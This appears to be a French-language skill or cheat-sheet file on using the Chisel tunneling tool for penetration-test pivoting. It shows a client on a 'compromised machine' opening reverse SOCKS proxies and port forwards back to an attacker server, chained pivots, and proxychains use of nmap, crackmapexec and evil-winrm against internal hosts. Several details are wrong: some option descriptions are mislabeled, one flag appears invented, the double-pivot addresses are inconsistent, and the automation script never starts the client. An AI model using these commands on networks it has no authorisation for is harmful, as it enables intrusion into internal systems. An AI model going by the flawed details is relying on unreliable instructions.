---
name: chisel
description: Chisel — tunnel TCP/HTTP/WebSocket, SOCKS proxy, reverse port forwarding, single-binary client/server, traversée de firewall, HTTP over WebSocket, et scénarios de pivoting avancés.
---

# Chisel — Tunnel TCP via WebSocket

## Présentation

Chisel crée des tunnels TCP sécurisés encapsulés dans HTTP via WebSocket. Un seul binaire fait serveur ET client. Parfait quand seul le port 443 (HTTPS) est ouvert.

**Installation :**
```bash
# Kali
sudo apt install chisel

# Dernière version
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_X.X.X_linux_amd64.gz
gunzip chisel_*.gz
chmod +x chisel
```

---

## Architecture

```
┌──────────────┐   WebSocket   ┌──────────────┐
│   Client     │◄────8080────►│   Serveur     │
│  (cible)     │   (HTTP)     │  (attaquant)  │
└──────────────┘               └──────┬───────┘
                                      │ SOCKS
                                      ▼
                              ┌──────────────┐
                              │  Réseau      │
                              │  Interne     │
                              └──────────────┘
```

---

## Mode SOCKS (proxy)

### Serveur (attaquant)
```bash
# Mode serveur avec SOCKS
chisel server -p 8080 --socks5 --reverse

# Serveur sur port 443 (comme HTTPS)
chisel server -p 443 --socks5 --reverse

# Avec authentification
chisel server -p 8080 --socks5 --reverse --auth user:password

# Serveur avec compression
chisel server -p 8080 --socks5 --reverse --compress

# Mode verbose (debug)
chisel server -v -p 8080 --socks5 --reverse
```

### Client (cible — machine compromise)
```bash
# Client se connecte au serveur + SOCKS proxy
chisel client 192.168.1.50:8080 R:socks

# Avec authentification
chisel client 192.168.1.50:8080 R:socks --auth user:password

# Via proxy HTTP existant (HTTP CONNECT)
chisel client http://proxy.corp:3128 192.168.1.50:8080 R:socks

# Avec compression
chisel client 192.168.1.50:8080 R:socks --compress

# Version Windows pareil (chisel.exe)
chisel client 192.168.1.50:8080 R:socks
```

### Utilisation du SOCKS proxy
```bash
# Configurer proxychains
cat /etc/proxychains4.conf
# [ProxyList]
# socks5 127.0.0.1 1080

# Lancer le chisel serveur avec SOCKS sur 1080
chisel server -p 8080 --socks5 --reverse

# Client se connecte
chisel client 192.168.1.50:8080 R:1080:socks

# Maintenant utiliser proxychains
proxychains nmap -sT -Pn 192.168.2.10
proxychains crackmapexec smb 192.168.2.10
proxychains evil-winrm -i 192.168.2.10 -u admin -p pass
proxychains rdesktop 192.168.2.10
```

---

## Mode Port Forwarding

### Forward simple (serveur → client)
```bash
# Serveur (attaquant)
chisel server -p 8080 --reverse

# Client : redirige le port local 3389 (RDP) vers le serveur
chisel client 192.168.1.50:8080 R:3389:localhost:3389

# Sur l'attaquant :
rdesktop 127.0.0.1:3389
# → Connexion au RDP de la cible
```

### Remote forwarding (client → serveur)
```bash
# Serveur (attaquant)
chisel server -p 8080 --reverse

# Client (cible) : expose le port RDP de la cible
chisel client 192.168.1.50:8080 \
    R:3389:127.0.0.1:3389

# Sur l'attaquant :
rdesktop 127.0.0.1:3389  # RDP de la cible
```

### Local forwarding (serveur → serveur)
```bash
# Serveur (attaquant) : rediriger un port vers le client
chisel server -p 8080 --reverse

# Client (cible)
chisel client 192.168.1.50:8080 \
    R:4444:127.0.0.1:4444

# Maintenant on peut lancer un listener sur 4444
nc -lvp 4444  # Reçu sur le client (cible)
```

### Multiple forwards
```bash
# Client : plusieurs redirections en une commande
chisel client 192.168.1.50:8080 \
    R:3389:127.0.0.1:3389 \
    R:445:127.0.0.1:445 \
    R:22:127.0.0.1:22
```

---

## Pivoting vers le réseau interne

### Forward vers une machine du réseau interne
```bash
# Client voit le réseau 192.168.2.0/24
# Forwarder un service interne vers l'attaquant

chisel client 192.168.1.50:8080 \
    R:8080:192.168.2.10:80 \
    R:3389:192.168.2.20:3389

# Sur l'attaquant :
# http://127.0.0.1:8080 → web de 192.168.2.10
# rdesktop 127.0.0.1:3389 → RDP de 192.168.2.20
```

### Pivoting + SOCKS
```bash
# Le plus flexible : SOCKS + forwards
chisel client 192.168.1.50:8080 \
    R:1080:socks \
    R:3389:192.168.2.10:3389

# SOCKS pour tout le trafic
proxychains nmap -sT 192.168.2.0/24

# Forward spécifique pour RDP
rdesktop 127.0.0.1:3389
```

---

## Double-pivoting (par Chaîne)

```
Attaquant ──── Chisel ──── Pivot1 ──── Chisel ──── Pivot2 ──── Cible
  Kali       (SOCKS)     192.168.1.x  (SOCKS)    192.168.2.x   10.0.0.x
```

### Configuration double-pivot
```bash
# === ATTAQUANT (Kali) ===
# Serveur Chisel 1
chisel server -p 8080 --socks5 --reverse

# === PIVOT 1 (192.168.1.10) ===
# Client vers attaquant + serveur Chisel 2 pour Pivot 2
chisel client 192.168.1.50:8080 R:1080:socks

# Sur Pivot 1, lancer un SECOND serveur Chisel
chisel server -p 8081 --socks5 --reverse

# === PIVOT 2 (192.168.2.10) ===
# Client vers Pivot 1
chisel client 192.168.2.10:8081 R:1081:socks

# === ATTAQUANT (Kali) ===
# Config proxychains pour chainer SOCKS
cat /etc/proxychains4.conf
# [ProxyList]
# socks5 127.0.0.1 1080      # Pivot 1
# socks5 127.0.0.1 1081      # Pivot 2

# Maintenant : proxychains nmap 10.0.0.0/24
proxychains nmap -sT 10.0.0.0/24
```

---

## Transfert de binaire via Chisel

```bash
# Chisel peut aussi servir de transfert de fichier
# Serveur :
chisel server -p 8080

# Client : rediriger le port (ex: HTTP server)
chisel client 192.168.1.50:8080 R:8080:192.168.1.50:8080

# OU : transfert direct via Chisel
# Serveur : chisel server -p 8080 --reverse
# Client : chisel client ... R:8000:127.0.0.1:8000
# Puis python3 -m http.server 8000 sur le serveur
```

---

## Chisel avec authentification

```bash
# Serveur
chisel server -p 8080 --socks5 --reverse --auth chiseluser:StrongP@ss

# Client
chisel client 192.168.1.50:8080 R:socks --auth chiseluser:StrongP@ss
```

---

## Options avancées

```bash
# Keepalive
chisel server -p 8080 --keepalive 25s

# Handshake timeout
chisel server -p 8080 --handshake-timeout 10s

# Taille max du payload
chisel server -p 8080 --max-latency 5s

# Nombre max de connexions
chisel server -p 8080 --max-retry-count 5

# TLS (HTTPS au lieu de HTTP)
# Serveur
chisel server -p 443 --tls-key key.pem --tls-cert cert.pem --reverse

# Client
chisel client https://192.168.1.50:443 R:socks

# Auto-génération du cert (dev)
chisel server -p 443 --tls-key key.pem --tls-cert cert.pem --reverse --authentication
```

---

## Script d'automatisation

```bash
#!/bin/bash
# chisel_socks.sh — Tunnel SOCKS rapide

SERVER_IP=$1
SERVER_PORT=${2:-8080}
SOCKS_PORT=${3:-1080}

echo "[+] Serveur Chisel sur $SERVER_IP:$SERVER_PORT"
chisel server -p $SERVER_PORT --socks5 --reverse &

echo "[+] Client Chisel vers $SERVER_IP..."
echo "    SOCKS5 sur 127.0.0.1:$SOCKS_PORT"
echo "    Utiliser: proxychains <commande>"
```

---

## Dépannage

| Problème | Solution |
|----------|----------|
| "Connection refused" | Vérifier le port serveur, firewall |
| SOCKS ne fonctionne pas | proxychains -sT (pas -sS pour nmap) |
| WebSocket bloqué | Proxy HTTP CONNECT (`chisel client http://proxy:3128 ...`) |
| Perte de connexion | Ajouter --keepalive 30s |
| TLS erreur | Vérifier les certificats, --tls-skip-verify |

---

## Antisèche rapide

```bash
# === ATTAQUANT ===
chisel server -p 8080 --socks5 --reverse

# === CIBLE ===
chisel client 192.168.1.50:8080 R:socks

# === ATTAQUANT ===
# Configurer /etc/proxychains4.conf
# socks5 127.0.0.1 1080

# Utiliser
proxychains nmap -sT 192.168.2.0/24
proxychains crackmapexec smb 192.168.2.10

# Forward de port
chisel client 192.168.1.50:8080 R:3389:127.0.0.1:3389
rdesktop 127.0.0.1:3389

# Multi-forwards
chisel client 192.168.1.50:8080 R:1080:socks R:3389:192.168.2.10:3389
```